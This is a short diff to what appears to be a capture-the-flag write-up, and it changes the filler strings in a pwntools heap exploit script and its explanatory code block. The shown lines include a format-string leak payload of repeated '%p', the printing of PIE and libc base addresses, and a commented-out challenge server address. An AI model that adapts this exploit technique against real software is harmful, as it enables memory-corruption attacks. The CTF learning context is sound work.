@@ -369,11 +369,11 @@ if __name__ == "__main__":
     p = process(binary)
     #p = remote('35.244.10.136', 10253)
 
-    alloc(1, 0x208,'hk')
+    alloc(1, 0x208,'AA')
 
-    alloc(7, 0x2000,'hk')
+    alloc(7, 0x2000,'AA')
 
-    alloc(9, 0x100, 'HKHK')
+    alloc(9, 0x100, 'AAAA')
 
     alloc(11, 0x100, '%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p') # leaky chunk
 
@@ -390,8 +390,8 @@ if __name__ == "__main__":
     print(f'Pie leak: {hex(pie_base)}')
     print(f'Libc base: {hex(libc_base)}')
 
-    alloc(0, 0x500, 'hk')
-    alloc(2, 0x500, 'hk')
+    alloc(0, 0x500, 'AA')
+    alloc(2, 0x500, 'AA')
 
     sice(0)
     sice(2)
@@ -452,11 +452,11 @@ Its important to mention that due to the behavior of the `print()` function we c
 Firstly, we start the binary, and make 4 allocations:
 
 ```py
-alloc(1, 0x208,'hk')
+alloc(1, 0x208,'AA')
 
-alloc(7, 0x2000,'hk')
+alloc(7, 0x2000,'AA')
 
-alloc(9, 0x100, 'HKHK')
+alloc(9, 0x100, 'AAAA')
 
 alloc(11, 0x100, '%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p') # leaky chunk
 ```
